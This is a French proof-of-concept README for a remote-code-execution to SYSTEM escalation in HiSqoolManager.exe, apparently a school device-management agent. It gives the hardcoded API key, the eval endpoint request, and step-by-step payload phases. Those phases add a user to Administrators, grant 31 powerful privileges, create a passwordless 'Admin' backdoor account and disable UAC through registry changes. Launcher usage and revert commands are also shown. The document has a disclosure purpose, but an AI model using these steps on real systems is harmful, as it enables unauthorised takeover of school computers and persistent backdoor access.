# POC — RCE -> LPE to SYSTEM -> Local Posture Takeover

> **Cible** : HiSqoolManager.exe (Unowhy, agent MDM scolaire)
> **Vecteur** : `POST /commands` — `category:js / command:eval / arguments.source`
> **Impact** : Un élève non-privilégié obtient les droits administrateurs locaux,
>              un compte backdoor "Admin" (mdp vide), et l'UAC désactivé.
> **Exécution** : Le code JS est eval'd dans un process Node tournant en **LocalSystem**.

---

## Architecture

```
run_poc.ps1 (lanceur, tourne en user standard)
  |
  |--- capture requester SID (whoami /user)
  |--- lit payload/poc_payload.js
  |--- injecte process.env.POC_* (SID, logDir, dry-run...)
  |--- wrappe dans IIFE: (function(){ ... })();
  |
  |=== POST http://127.0.0.1:7654/commands ===
  |    x-api-key: would-nepal-sing-below
  |    body: { category:"js", command:"eval", arguments:{ source: <JS> } }
  |
  v
HiSqoolManager.exe (NestJS, LocalSystem)
  |
  |--- evalSource(source) dans process SYSTEM
  |--- payload.js exécute les phases A-F
  |--- logs + artefacts dans C:\Windows\System32\zcode_poc\<runId>\
  |
run_poc.ps1
  |
  |--- copie les artefacts System32 -> runs/<runId>/
  |--- parse summary.json, vérifie chaque phase
  |--- log final + verdict
```

## Fichiers

| Fichier | Rôle |
|---------|------|
| `run_poc.ps1` | Lanceur PowerShell. Capture contexte requester, envoie le payload, récupère artefacts, verdict. |
| `payload/poc_payload.js` | Payload JS exécuté par le service SYSTEM. Multi-phase avec logging fichier. |
| `runs/` | Sortie : logs launcher + artefacts SYSTEM copiés sur la clé USB. |
| `verification/` | (réservé) scripts de vérification post-run indépendants. |

## Phases du payload

### Phase A — Identité + résolution cible
- `whoami`, `os.userInfo()`, dump PID/PPID/execPath → `identity.json`
- Si SID fourni → résout en nom (FR/EN automatique via `NTAccount.Translate`)
- Si nom fourni → résout en SID via `NTAccount.Translate`
- Preuve LPE : le fichier est écrit dans `System32\zcode_poc\` (SYSTEM-only)

### Phase B — Ajout au groupe Administrateurs
- `Add-LocalGroupMember -SID S-1-5-32-544 -Member <SID cible>`
- **SID well-known** S-1-5-32-544 = Administrateurs (invariant FR/EN)
- Gère "already a member" gracieusement

### Phase C — User Rights Assignment (31 privilèges)
- Export via `secedit /export` → merge avec les droits existants
- Injection du SID cible dans 31 droits :
  - `SeTcbPrivilege` (act as OS)
  - `SeAssignPrimaryTokenPrivilege`
  - `SeCreateTokenPrivilege`
  - `SeDebugPrivilege` (debug other processes)
  - `SeImpersonatePrivilege`
  - `SeLoadDriverPrivilege`
  - `SeBackupPrivilege` / `SeRestorePrivilege`
  - `SeSecurityPrivilege` / `SeTakeOwnershipPrivilege`
  - `SeSystemtimePrivilege` / `SeSystemEnvironmentPrivilege`
  - `SeProfileSingleProcessPrivilege` / `SeSystemProfilePrivilege`
  - `SeShutdownPrivilege`
  - `SeUndockPrivilege` / `SeManageVolumePrivilege`
  - `SeBatchLogonRight` / `SeInteractiveLogonRight`
  - `SeServiceLogonRight` / `SeNetworkLogonRight`
  - `SeRemoteInteractiveLogonRight`
  - `SeChangeNotifyPrivilege` / `SeCreateGlobalPrivilege`
  - `SeCreatePagefilePrivilege` / `SeCreatePermanentPrivilege`
  - `SeCreateSymbolicLinkPrivilege`
  - `SeIncreaseQuotaPrivilege` / `SeMachineAccountPrivilege`
  - `SeAuditPrivilege` / `SeTrustedCredManAccessPrivilege`
- Application via `secedit /configure /areas USER_RIGHTS`
- Les `SeDeny*` pour la cible sont retirés (neutralisation des deny)

### Phase D — Création compte "Admin" (mdp vide) + ajout Admins
- `secedit /configure` → `MinimumPasswordLength=0`, `PasswordComplexity=0`
- `net user "Admin" "" /add /y /expires:never`
- Fallback : `New-LocalUser -Name "Admin" -NoPassword`
- `Set-LocalUser -Name "Admin" -PasswordNeverExpires $true`
- `Add-LocalGroupMember -SID S-1-5-32-544 -Member "Admin"`

### Phase E — Désactivation UAC
6 clés registre sous `HKLM\...\Policies\System` :
- `EnableLUA = 0` (master switch)
- `ConsentPromptBehaviorAdmin = 0` (auto-elevate admins)
- `ConsentPromptBehaviorUser = 0` (auto-exec users)
- `EnableInstallerDetection = 0`
- `ValidateAdminCodeSignatures = 0`
- `FilterAdministratorToken = 0`

### Phase F — Vérification
Dump de l'état réel post-mutation (proof durable) :
- `whoami /groups` → vérifie S-1-5-32-544
- `whoami /priv` → dump privilèges
- `net user <cible>` / `net user Admin`
- `net localgroup Administrators`
- `secedit /export` → dump policy effectif
- `reg query` UAC keys

## Utilisation

### Sur la cible (USB key, user standard)

```powershell
# Mode normal (mutations réelles)
.\run_poc.ps1

# Cible explicite (RCE LAN distante)
.\run_poc.ps1 -TargetUser "ENT\TestUser"
.\run_poc.ps1 -TargetSid "S-1-5-21-...-1001"

# Dry-run (lecture seule, aucune mutation)
.\run_poc.ps1 -DryRun

# Compte backdoor personnalisé
.\run_poc.ps1 -NewAdminName "Backdoor"

# Ne pas nettoyer les artefacts System32
.\run_poc.ps1 -NoCleanup
```

### Sortie attendue

```
runs/poc_HOSTNAME_20260715_223000/
  launcher_HOSTNAME_20260715_223000.log    # log du lanceur
  poc_HOSTNAME_20260715_223000/            # artefacts SYSTEM copiés
    payload.log                             # exécution détaillée phase par phase
    summary.json                            # { ok:true, phases:{A..F:true} }
    poc_complete.marker                     # "POC complete <timestamp>"
    identity.json                           # dump identité SYSTEM (preuve LPE)
    verify_whoami_groups.txt                # groupes SYSTEM
    verify_uac_reg.txt                      # clés UAC
    verify_secedit.inf                      # politique effective
    secedit_export.inf                      # politique avant mutation
    secedit_apply.inf                       # politique injectée
    ...
```

## Revert (nettoyage post-pentest)

Le lanceur logge automatiquement les commandes de revert en fin d'exécution.
Commandes SID-based, locale-independantes :

```powershell
# 1. Retirer la cible des Admins
powershell -Command "Remove-LocalGroupMember -SID 'S-1-5-32-544' -Member '<SID_CIBLE>'"

# 2. Supprimer le compte backdoor
net user Admin /delete

# 3. Réactiver l'UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorUser /t REG_DWORD /d 3 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 1 /f

# 4. Revenir à la policy baseline
secedit /configure /cfg baseline_sain.inf /overwrite /areas USER_RIGHTS

# 5. Rafraîchir
gpupdate /force
```

## Design FR/EN

Toutes les opérations utilisent des **SID well-known** au lieu des noms localisés :
- `S-1-5-32-544` = Administrateurs / Administrators
- Droits par nom invariant : `SeDebugPrivilege` etc. (pas traduits par Windows)
- Résolution dynamique SID ↔ name via `NTAccount.Translate()` / `SecurityIdentifier.Translate()`

## CWE associés

| CWE | Description |
|-----|-------------|
| CWE-94 | Code Injection (eval de source externe) |
| CWE-306 | Missing Authentication (clé statique universelle) |
| CWE-778 | Insufficient Logging (pas de log des eval dans le service) |
| CWE-269 | Improper Privilege Management (service SYSTEM avec eval public) |
| CWE-250 | Execution with Unnecessary Privileges (SYSTEM pour un MDM agent) |
